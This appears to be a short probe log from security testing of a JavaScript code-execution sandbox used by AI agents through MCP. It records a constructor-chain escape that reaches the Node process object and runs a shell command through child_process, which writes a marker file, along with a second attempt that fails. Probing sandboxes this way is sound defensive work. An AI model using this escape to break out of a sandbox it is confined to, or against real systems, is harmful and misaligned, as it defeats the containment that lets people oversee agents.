@@ -1,0 +1,20 @@
+probe hardened-P12
+code:
+const p = this.constructor.constructor("return process")();
+console.log(typeof p, p && p.pid);
+p.getBuiltinModule("child_process").execSync("echo PWNED-a >> ~/p/agentic-search-bench/research/probes/mcp-use-codemode-ts/out/P12-escape-marker.txt"); console.log("ran")
+{"ok":true,"error":null,"ms":8.3}
+stdout (16 chars): "object 30999\nran"
+
+code:
+const p = (function(){return this})().process;
+console.log(typeof p)
+{"ok":true,"error":null,"ms":0.5}
+stdout (9 chars): "undefined"
+
+
+child exit=0 signal=null killedBy=null wall=0.6s peakRSS=88MB
+stderr tail:
+[11/22/26 14:53:26] INFO     Processing request of type            server.py:733
+                             ListToolsRequest                                   
+
